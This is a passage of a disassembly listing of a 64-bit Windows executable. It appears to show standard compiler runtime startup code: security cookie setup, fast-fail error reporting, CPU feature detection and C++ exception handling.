   140001e57:	48 87 15 aa 61 01 00 	xchg   %rdx,0x161aa(%rip)        # 0x140018008
   140001e5e:	48 83 c4 20          	add    $0x20,%rsp
   140001e62:	5b                   	pop    %rbx
   140001e63:	c3                   	ret
   140001e64:	40 53                	rex push %rbx
   140001e66:	48 83 ec 20          	sub    $0x20,%rsp
   140001e6a:	80 3d 9f 61 01 00 00 	cmpb   $0x0,0x1619f(%rip)        # 0x140018010
   140001e71:	8a d9                	mov    %cl,%bl
   140001e73:	74 04                	je     0x140001e79
   140001e75:	84 d2                	test   %dl,%dl
   140001e77:	75 0c                	jne    0x140001e85
   140001e79:	e8 ea 2f 00 00       	call   0x140004e68
   140001e7e:	8a cb                	mov    %bl,%cl
   140001e80:	e8 b3 09 00 00       	call   0x140002838
   140001e85:	b0 01                	mov    $0x1,%al
   140001e87:	48 83 c4 20          	add    $0x20,%rsp
   140001e8b:	5b                   	pop    %rbx
   140001e8c:	c3                   	ret
   140001e8d:	cc                   	int3
   140001e8e:	cc                   	int3
   140001e8f:	cc                   	int3
   140001e90:	40 53                	rex push %rbx
   140001e92:	48 83 ec 20          	sub    $0x20,%rsp
   140001e96:	48 83 3d 7a 61 01 00 	cmpq   $0xffffffffffffffff,0x1617a(%rip)        # 0x140018018
   140001e9d:	ff 
   140001e9e:	48 8b d9             	mov    %rcx,%rbx
   140001ea1:	75 07                	jne    0x140001eaa
   140001ea3:	e8 c4 2d 00 00       	call   0x140004c6c
   140001ea8:	eb 0f                	jmp    0x140001eb9
   140001eaa:	48 8b d3             	mov    %rbx,%rdx
   140001ead:	48 8d 0d 64 61 01 00 	lea    0x16164(%rip),%rcx        # 0x140018018
   140001eb4:	e8 27 2e 00 00       	call   0x140004ce0
   140001eb9:	33 d2                	xor    %edx,%edx
   140001ebb:	85 c0                	test   %eax,%eax
   140001ebd:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001ec1:	48 8b c2             	mov    %rdx,%rax
   140001ec4:	48 83 c4 20          	add    $0x20,%rsp
   140001ec8:	5b                   	pop    %rbx
   140001ec9:	c3                   	ret
   140001eca:	cc                   	int3
   140001ecb:	cc                   	int3
   140001ecc:	48 83 ec 28          	sub    $0x28,%rsp
   140001ed0:	e8 bb ff ff ff       	call   0x140001e90
   140001ed5:	48 f7 d8             	neg    %rax
   140001ed8:	1b c0                	sbb    %eax,%eax
   140001eda:	f7 d8                	neg    %eax
   140001edc:	ff c8                	dec    %eax
   140001ede:	48 83 c4 28          	add    $0x28,%rsp
   140001ee2:	c3                   	ret
   140001ee3:	cc                   	int3
   140001ee4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001ee9:	55                   	push   %rbp
   140001eea:	48 8b ec             	mov    %rsp,%rbp
   140001eed:	48 83 ec 20          	sub    $0x20,%rsp
   140001ef1:	48 8b 05 08 51 01 00 	mov    0x15108(%rip),%rax        # 0x140017000
   140001ef8:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001eff:	2b 00 00 
   140001f02:	48 3b c3             	cmp    %rbx,%rax
   140001f05:	75 74                	jne    0x140001f7b
   140001f07:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140001f0c:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001f10:	ff 15 fa b1 00 00    	call   *0xb1fa(%rip)        # 0x14000d110
   140001f16:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001f1a:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001f1e:	ff 15 e4 b1 00 00    	call   *0xb1e4(%rip)        # 0x14000d108
   140001f24:	8b c0                	mov    %eax,%eax
   140001f26:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001f2a:	ff 15 68 b1 00 00    	call   *0xb168(%rip)        # 0x14000d098
   140001f30:	8b c0                	mov    %eax,%eax
   140001f32:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001f36:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001f3a:	ff 15 c0 b1 00 00    	call   *0xb1c0(%rip)        # 0x14000d100
   140001f40:	8b 45 20             	mov    0x20(%rbp),%eax
   140001f43:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001f47:	48 c1 e0 20          	shl    $0x20,%rax
   140001f4b:	48 33 45 20          	xor    0x20(%rbp),%rax
   140001f4f:	48 33 45 10          	xor    0x10(%rbp),%rax
   140001f53:	48 33 c1             	xor    %rcx,%rax
   140001f56:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001f5d:	ff 00 00 
   140001f60:	48 23 c1             	and    %rcx,%rax
   140001f63:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140001f6a:	2b 00 00 
   140001f6d:	48 3b c3             	cmp    %rbx,%rax
   140001f70:	48 0f 44 c1          	cmove  %rcx,%rax
   140001f74:	48 89 05 85 50 01 00 	mov    %rax,0x15085(%rip)        # 0x140017000
   140001f7b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001f80:	48 f7 d0             	not    %rax
   140001f83:	48 89 05 7e 50 01 00 	mov    %rax,0x1507e(%rip)        # 0x140017008
   140001f8a:	48 83 c4 20          	add    $0x20,%rsp
   140001f8e:	5d                   	pop    %rbp
   140001f8f:	c3                   	ret
   140001f90:	33 c0                	xor    %eax,%eax
   140001f92:	c3                   	ret
   140001f93:	cc                   	int3
   140001f94:	b8 01 00 00 00       	mov    $0x1,%eax
   140001f99:	c3                   	ret
   140001f9a:	cc                   	int3
   140001f9b:	cc                   	int3
   140001f9c:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001fa1:	c3                   	ret
   140001fa2:	cc                   	int3
   140001fa3:	cc                   	int3
   140001fa4:	48 8d 0d a5 60 01 00 	lea    0x160a5(%rip),%rcx        # 0x140018050
   140001fab:	48 ff 25 66 b1 00 00 	rex.W jmp *0xb166(%rip)        # 0x14000d118
   140001fb2:	cc                   	int3
   140001fb3:	cc                   	int3
   140001fb4:	b0 01                	mov    $0x1,%al
   140001fb6:	c3                   	ret
   140001fb7:	cc                   	int3
   140001fb8:	c2 00 00             	ret    $0x0
   140001fbb:	cc                   	int3
   140001fbc:	48 8d 05 9d 60 01 00 	lea    0x1609d(%rip),%rax        # 0x140018060
   140001fc3:	c3                   	ret
   140001fc4:	48 8d 05 9d 60 01 00 	lea    0x1609d(%rip),%rax        # 0x140018068
   140001fcb:	c3                   	ret
   140001fcc:	48 83 ec 28          	sub    $0x28,%rsp
   140001fd0:	e8 e7 ff ff ff       	call   0x140001fbc
   140001fd5:	48 83 08 24          	orq    $0x24,(%rax)
   140001fd9:	e8 e6 ff ff ff       	call   0x140001fc4
   140001fde:	48 83 08 02          	orq    $0x2,(%rax)
   140001fe2:	48 83 c4 28          	add    $0x28,%rsp
   140001fe6:	c3                   	ret
   140001fe7:	cc                   	int3
   140001fe8:	33 c0                	xor    %eax,%eax
   140001fea:	39 05 24 50 01 00    	cmp    %eax,0x15024(%rip)        # 0x140017014
   140001ff0:	0f 94 c0             	sete   %al
   140001ff3:	c3                   	ret
   140001ff4:	48 8d 05 55 6c 01 00 	lea    0x16c55(%rip),%rax        # 0x140018c50
   140001ffb:	c3                   	ret
   140001ffc:	48 8d 05 45 6c 01 00 	lea    0x16c45(%rip),%rax        # 0x140018c48
   140002003:	c3                   	ret
   140002004:	83 25 65 60 01 00 00 	andl   $0x0,0x16065(%rip)        # 0x140018070
   14000200b:	c3                   	ret
   14000200c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002011:	55                   	push   %rbp
   140002012:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140002019:	ff 
   14000201a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140002021:	8b d9                	mov    %ecx,%ebx
   140002023:	b9 17 00 00 00       	mov    $0x17,%ecx
   140002028:	ff 15 ca b0 00 00    	call   *0xb0ca(%rip)        # 0x14000d0f8
   14000202e:	85 c0                	test   %eax,%eax
   140002030:	74 04                	je     0x140002036
   140002032:	8b cb                	mov    %ebx,%ecx
   140002034:	cd 29                	int    $0x29
   140002036:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000203b:	e8 c4 ff ff ff       	call   0x140002004
   140002040:	33 d2                	xor    %edx,%edx
   140002042:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002046:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000204c:	e8 cf 08 00 00       	call   0x140002920
   140002051:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002055:	ff 15 75 b0 00 00    	call   *0xb075(%rip)        # 0x14000d0d0
   14000205b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140002062:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140002069:	48 8b cb             	mov    %rbx,%rcx
   14000206c:	45 33 c0             	xor    %r8d,%r8d
   14000206f:	ff 15 63 b0 00 00    	call   *0xb063(%rip)        # 0x14000d0d8
   140002075:	48 85 c0             	test   %rax,%rax
   140002078:	74 3c                	je     0x1400020b6
   14000207a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002080:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140002087:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   14000208e:	4c 8b c8             	mov    %rax,%r9
   140002091:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002096:	4c 8b c3             	mov    %rbx,%r8
   140002099:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400020a0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400020a5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400020a9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400020ae:	33 c9                	xor    %ecx,%ecx
   1400020b0:	ff 15 2a b0 00 00    	call   *0xb02a(%rip)        # 0x14000d0e0
   1400020b6:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400020bd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400020c2:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400020c9:	33 d2                	xor    %edx,%edx
   1400020cb:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400020d2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400020d8:	48 83 c0 08          	add    $0x8,%rax
   1400020dc:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400020e3:	e8 38 08 00 00       	call   0x140002920
   1400020e8:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400020ef:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400020f4:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400020fb:	40 
   1400020fc:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140002103:	00 
   140002104:	ff 15 16 b0 00 00    	call   *0xb016(%rip)        # 0x14000d120
   14000210a:	83 f8 01             	cmp    $0x1,%eax
   14000210d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002112:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002117:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000211b:	0f 94 c3             	sete   %bl
   14000211e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002123:	33 c9                	xor    %ecx,%ecx
   140002125:	ff 15 c5 af 00 00    	call   *0xafc5(%rip)        # 0x14000d0f0
   14000212b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002130:	ff 15 b2 af 00 00    	call   *0xafb2(%rip)        # 0x14000d0e8
   140002136:	85 c0                	test   %eax,%eax
   140002138:	75 0c                	jne    0x140002146
   14000213a:	84 db                	test   %bl,%bl
   14000213c:	75 08                	jne    0x140002146
   14000213e:	8d 48 03             	lea    0x3(%rax),%ecx
   140002141:	e8 be fe ff ff       	call   0x140002004
   140002146:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000214d:	00 
   14000214e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140002155:	5d                   	pop    %rbp
   140002156:	c3                   	ret
   140002157:	cc                   	int3
   140002158:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000215f:	33 d2                	xor    %edx,%edx
   140002161:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002166:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000216a:	e8 b1 07 00 00       	call   0x140002920
   14000216f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002174:	ff 15 ae af 00 00    	call   *0xafae(%rip)        # 0x14000d128
   14000217a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000217f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002184:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000218a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140002191:	c3                   	ret
   140002192:	cc                   	int3
   140002193:	cc                   	int3
   140002194:	e9 f7 fd ff ff       	jmp    0x140001f90
   140002199:	cc                   	int3
   14000219a:	cc                   	int3
   14000219b:	cc                   	int3
   14000219c:	48 83 ec 28          	sub    $0x28,%rsp
   1400021a0:	33 c9                	xor    %ecx,%ecx
   1400021a2:	ff 15 98 ae 00 00    	call   *0xae98(%rip)        # 0x14000d040
   1400021a8:	48 85 c0             	test   %rax,%rax
   1400021ab:	74 39                	je     0x1400021e6
   1400021ad:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400021b2:	66 39 08             	cmp    %cx,(%rax)
   1400021b5:	75 2f                	jne    0x1400021e6
   1400021b7:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400021bb:	48 03 c8             	add    %rax,%rcx
   1400021be:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400021c4:	75 20                	jne    0x1400021e6
   1400021c6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400021cb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400021cf:	75 15                	jne    0x1400021e6
   1400021d1:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400021d8:	76 0c                	jbe    0x1400021e6
   1400021da:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1400021e1:	0f 95 c0             	setne  %al
   1400021e4:	eb 02                	jmp    0x1400021e8
   1400021e6:	32 c0                	xor    %al,%al
   1400021e8:	48 83 c4 28          	add    $0x28,%rsp
   1400021ec:	c3                   	ret
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140002200
   1400021f7:	48 ff 25 f2 ae 00 00 	rex.W jmp *0xaef2(%rip)        # 0x14000d0f0
   1400021fe:	cc                   	int3
   1400021ff:	cc                   	int3
   140002200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002205:	57                   	push   %rdi
   140002206:	48 83 ec 20          	sub    $0x20,%rsp
   14000220a:	48 8b 19             	mov    (%rcx),%rbx
   14000220d:	48 8b f9             	mov    %rcx,%rdi
   140002210:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140002216:	75 1c                	jne    0x140002234
   140002218:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000221c:	75 16                	jne    0x140002234
   14000221e:	8b 53 20             	mov    0x20(%rbx),%edx
   140002221:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   140002227:	83 f8 02             	cmp    $0x2,%eax
   14000222a:	76 15                	jbe    0x140002241
   14000222c:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140002232:	74 0d                	je     0x140002241
   140002234:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002239:	33 c0                	xor    %eax,%eax
   14000223b:	48 83 c4 20          	add    $0x20,%rsp
   14000223f:	5f                   	pop    %rdi
   140002240:	c3                   	ret
   140002241:	e8 82 06 00 00       	call   0x1400028c8
   140002246:	48 89 18             	mov    %rbx,(%rax)
   140002249:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000224d:	e8 8a 06 00 00       	call   0x1400028dc
   140002252:	48 89 18             	mov    %rbx,(%rax)
   140002255:	e8 46 2c 00 00       	call   0x140004ea0
   14000225a:	cc                   	int3
   14000225b:	cc                   	int3
   14000225c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002261:	57                   	push   %rdi
   140002262:	48 83 ec 20          	sub    $0x20,%rsp
   140002266:	48 8d 1d 7b 36 01 00 	lea    0x1367b(%rip),%rbx        # 0x1400158e8
   14000226d:	48 8d 3d 74 36 01 00 	lea    0x13674(%rip),%rdi        # 0x1400158e8
   140002274:	eb 12                	jmp    0x140002288
   140002276:	48 8b 03             	mov    (%rbx),%rax
   140002279:	48 85 c0             	test   %rax,%rax
   14000227c:	74 06                	je     0x140002284
   14000227e:	ff 15 04 b0 00 00    	call   *0xb004(%rip)        # 0x14000d288
   140002284:	48 83 c3 08          	add    $0x8,%rbx
   140002288:	48 3b df             	cmp    %rdi,%rbx
   14000228b:	72 e9                	jb     0x140002276
   14000228d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002292:	48 83 c4 20          	add    $0x20,%rsp
   140002296:	5f                   	pop    %rdi
   140002297:	c3                   	ret
   140002298:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000229d:	57                   	push   %rdi
   14000229e:	48 83 ec 20          	sub    $0x20,%rsp
   1400022a2:	48 8d 1d 4f 36 01 00 	lea    0x1364f(%rip),%rbx        # 0x1400158f8
   1400022a9:	48 8d 3d 48 36 01 00 	lea    0x13648(%rip),%rdi        # 0x1400158f8
   1400022b0:	eb 12                	jmp    0x1400022c4
   1400022b2:	48 8b 03             	mov    (%rbx),%rax
   1400022b5:	48 85 c0             	test   %rax,%rax
   1400022b8:	74 06                	je     0x1400022c0
   1400022ba:	ff 15 c8 af 00 00    	call   *0xafc8(%rip)        # 0x14000d288
   1400022c0:	48 83 c3 08          	add    $0x8,%rbx
   1400022c4:	48 3b df             	cmp    %rdi,%rbx
   1400022c7:	72 e9                	jb     0x1400022b2
   1400022c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400022ce:	48 83 c4 20          	add    $0x20,%rsp
   1400022d2:	5f                   	pop    %rdi
   1400022d3:	c3                   	ret
   1400022d4:	40 53                	rex push %rbx
   1400022d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400022da:	48 8d 05 27 b1 00 00 	lea    0xb127(%rip),%rax        # 0x14000d408
   1400022e1:	48 8b d9             	mov    %rcx,%rbx
   1400022e4:	48 89 01             	mov    %rax,(%rcx)
   1400022e7:	f6 c2 01             	test   $0x1,%dl
   1400022ea:	74 0a                	je     0x1400022f6
   1400022ec:	ba 18 00 00 00       	mov    $0x18,%edx
   1400022f1:	e8 ee f2 ff ff       	call   0x1400015e4
   1400022f6:	48 8b c3             	mov    %rbx,%rax
   1400022f9:	48 83 c4 20          	add    $0x20,%rsp
   1400022fd:	5b                   	pop    %rbx
   1400022fe:	c3                   	ret
   1400022ff:	cc                   	int3
   140002300:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002305:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000230a:	57                   	push   %rdi
   14000230b:	48 83 ec 10          	sub    $0x10,%rsp
   14000230f:	33 c0                	xor    %eax,%eax
   140002311:	33 c9                	xor    %ecx,%ecx
   140002313:	0f a2                	cpuid
   140002315:	44 8b c1             	mov    %ecx,%r8d
   140002318:	45 33 db             	xor    %r11d,%r11d
   14000231b:	44 8b d2             	mov    %edx,%r10d
   14000231e:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140002325:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   14000232c:	44 8b cb             	mov    %ebx,%r9d
   14000232f:	8b f0                	mov    %eax,%esi
   140002331:	33 c9                	xor    %ecx,%ecx
   140002333:	41 8d 43 01          	lea    0x1(%r11),%eax
   140002337:	45 0b d0             	or     %r8d,%r10d
   14000233a:	0f a2                	cpuid
   14000233c:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   140002343:	89 04 24             	mov    %eax,(%rsp)
   140002346:	45 0b d1             	or     %r9d,%r10d
   140002349:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000234d:	8b f9                	mov    %ecx,%edi
   14000234f:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002353:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140002357:	75 5b                	jne    0x1400023b4
   140002359:	48 83 0d c7 4c 01 00 	orq    $0xffffffffffffffff,0x14cc7(%rip)        # 0x140017028
   140002360:	ff 
   140002361:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140002366:	48 c7 05 af 4c 01 00 	movq   $0x8000,0x14caf(%rip)        # 0x140017020
   14000236d:	00 80 00 00 
   140002371:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140002376:	74 28                	je     0x1400023a0
   140002378:	3d 60 06 02 00       	cmp    $0x20660,%eax
   14000237d:	74 21                	je     0x1400023a0
   14000237f:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140002384:	74 1a                	je     0x1400023a0
   140002386:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   14000238b:	83 f8 20             	cmp    $0x20,%eax
   14000238e:	77 24                	ja     0x1400023b4
   140002390:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140002397:	00 00 00 
   14000239a:	48 0f a3 c1          	bt     %rax,%rcx
   14000239e:	73 14                	jae    0x1400023b4
   1400023a0:	44 8b 05 cd 5c 01 00 	mov    0x15ccd(%rip),%r8d        # 0x140018074
   1400023a7:	41 83 c8 01          	or     $0x1,%r8d
   1400023ab:	44 89 05 c2 5c 01 00 	mov    %r8d,0x15cc2(%rip)        # 0x140018074
   1400023b2:	eb 07                	jmp    0x1400023bb
   1400023b4:	44 8b 05 b9 5c 01 00 	mov    0x15cb9(%rip),%r8d        # 0x140018074
   1400023bb:	b8 07 00 00 00       	mov    $0x7,%eax
   1400023c0:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   1400023c4:	3b f0                	cmp    %eax,%esi
   1400023c6:	7c 26                	jl     0x1400023ee
   1400023c8:	33 c9                	xor    %ecx,%ecx
   1400023ca:	0f a2                	cpuid
   1400023cc:	89 04 24             	mov    %eax,(%rsp)
   1400023cf:	44 8b db             	mov    %ebx,%r11d
   1400023d2:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   1400023d6:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400023da:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   1400023de:	0f ba e3 09          	bt     $0x9,%ebx
   1400023e2:	73 0a                	jae    0x1400023ee
   1400023e4:	45 0b c1             	or     %r9d,%r8d
   1400023e7:	44 89 05 86 5c 01 00 	mov    %r8d,0x15c86(%rip)        # 0x140018074
   1400023ee:	c7 05 20 4c 01 00 01 	movl   $0x1,0x14c20(%rip)        # 0x140017018
   1400023f5:	00 00 00 
   1400023f8:	44 89 0d 1d 4c 01 00 	mov    %r9d,0x14c1d(%rip)        # 0x14001701c
   1400023ff:	0f ba e7 14          	bt     $0x14,%edi
   140002403:	0f 83 91 00 00 00    	jae    0x14000249a
   140002409:	44 89 0d 08 4c 01 00 	mov    %r9d,0x14c08(%rip)        # 0x140017018
   140002410:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002415:	89 1d 01 4c 01 00    	mov    %ebx,0x14c01(%rip)        # 0x14001701c
   14000241b:	0f ba e7 1b          	bt     $0x1b,%edi
   14000241f:	73 79                	jae    0x14000249a
   140002421:	0f ba e7 1c          	bt     $0x1c,%edi
   140002425:	73 73                	jae    0x14000249a
   140002427:	33 c9                	xor    %ecx,%ecx
   140002429:	0f 01 d0             	xgetbv
   14000242c:	48 c1 e2 20          	shl    $0x20,%rdx
   140002430:	48 0b d0             	or     %rax,%rdx
   140002433:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002438:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000243d:	22 c3                	and    %bl,%al
   14000243f:	3a c3                	cmp    %bl,%al
   140002441:	75 57                	jne    0x14000249a
   140002443:	8b 05 d3 4b 01 00    	mov    0x14bd3(%rip),%eax        # 0x14001701c
   140002449:	83 c8 08             	or     $0x8,%eax
   14000244c:	c7 05 c2 4b 01 00 03 	movl   $0x3,0x14bc2(%rip)        # 0x140017018
   140002453:	00 00 00 
   140002456:	89 05 c0 4b 01 00    	mov    %eax,0x14bc0(%rip)        # 0x14001701c
   14000245c:	41 f6 c3 20          	test   $0x20,%r11b
   140002460:	74 38                	je     0x14000249a
   140002462:	83 c8 20             	or     $0x20,%eax
   140002465:	c7 05 a9 4b 01 00 05 	movl   $0x5,0x14ba9(%rip)        # 0x140017018
   14000246c:	00 00 00 
   14000246f:	89 05 a7 4b 01 00    	mov    %eax,0x14ba7(%rip)        # 0x14001701c
   140002475:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   14000247a:	44 23 d8             	and    %eax,%r11d
   14000247d:	44 3b d8             	cmp    %eax,%r11d
   140002480:	75 18                	jne    0x14000249a
   140002482:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002487:	24 e0                	and    $0xe0,%al
   140002489:	3c e0                	cmp    $0xe0,%al
   14000248b:	75 0d                	jne    0x14000249a
   14000248d:	83 0d 88 4b 01 00 40 	orl    $0x40,0x14b88(%rip)        # 0x14001701c
   140002494:	89 1d 7e 4b 01 00    	mov    %ebx,0x14b7e(%rip)        # 0x140017018
   14000249a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000249f:	33 c0                	xor    %eax,%eax
   1400024a1:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400024a6:	48 83 c4 10          	add    $0x10,%rsp
   1400024aa:	5f                   	pop    %rdi
   1400024ab:	c3                   	ret
   1400024ac:	33 c0                	xor    %eax,%eax
   1400024ae:	39 05 8c 67 01 00    	cmp    %eax,0x1678c(%rip)        # 0x140018c40
   1400024b4:	0f 95 c0             	setne  %al
   1400024b7:	c3                   	ret
   1400024b8:	cc                   	int3
   1400024b9:	cc                   	int3
   1400024ba:	cc                   	int3
   1400024bb:	cc                   	int3
   1400024bc:	cc                   	int3
   1400024bd:	cc                   	int3
   1400024be:	cc                   	int3
   1400024bf:	cc                   	int3
   1400024c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400024c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400024ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400024cf:	57                   	push   %rdi
   1400024d0:	41 54                	push   %r12
   1400024d2:	41 55                	push   %r13
   1400024d4:	41 56                	push   %r14
   1400024d6:	41 57                	push   %r15
   1400024d8:	48 83 ec 40          	sub    $0x40,%rsp
   1400024dc:	48 8b e9             	mov    %rcx,%rbp
   1400024df:	4d 8b f9             	mov    %r9,%r15
   1400024e2:	49 8b c8             	mov    %r8,%rcx
   1400024e5:	49 8b f0             	mov    %r8,%rsi
   1400024e8:	4c 8b ea             	mov    %rdx,%r13
   1400024eb:	e8 04 08 00 00       	call   0x140002cf4
   1400024f0:	4d 8b 67 08          	mov    0x8(%r15),%r12
   1400024f4:	4d 8b 37             	mov    (%r15),%r14
   1400024f7:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   1400024fb:	4d 2b f4             	sub    %r12,%r14
   1400024fe:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   140002502:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140002506:	0f 85 dc 00 00 00    	jne    0x1400025e8
   14000250c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140002511:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140002516:	3b 3b                	cmp    (%rbx),%edi
   140002518:	0f 83 76 01 00 00    	jae    0x140002694
   14000251e:	8b f7                	mov    %edi,%esi
   140002520:	48 03 f6             	add    %rsi,%rsi
   140002523:	8b 44 f3 04          	mov    0x4(%rbx,%rsi,8),%eax
   140002527:	4c 3b f0             	cmp    %rax,%r14
   14000252a:	0f 82 aa 00 00 00    	jb     0x1400025da
   140002530:	8b 44 f3 08          	mov    0x8(%rbx,%rsi,8),%eax
   140002534:	4c 3b f0             	cmp    %rax,%r14
   140002537:	0f 83 9d 00 00 00    	jae    0x1400025da
   14000253d:	83 7c f3 10 00       	cmpl   $0x0,0x10(%rbx,%rsi,8)
   140002542:	0f 84 92 00 00 00    	je     0x1400025da
   140002548:	83 7c f3 0c 01       	cmpl   $0x1,0xc(%rbx,%rsi,8)
   14000254d:	74 17                	je     0x140002566
   14000254f:	8b 44 f3 0c          	mov    0xc(%rbx,%rsi,8),%eax
   140002553:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002558:	49 03 c4             	add    %r12,%rax
   14000255b:	49 8b d5             	mov    %r13,%rdx
   14000255e:	ff d0                	call   *%rax
   140002560:	85 c0                	test   %eax,%eax
   140002562:	78 7d                	js     0x1400025e1
   140002564:	7e 74                	jle    0x1400025da
   140002566:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   14000256d:	75 28                	jne    0x140002597
   14000256f:	48 83 3d 99 ae 00 00 	cmpq   $0x0,0xae99(%rip)        # 0x14000d410
   140002576:	00 
   140002577:	74 1e                	je     0x140002597
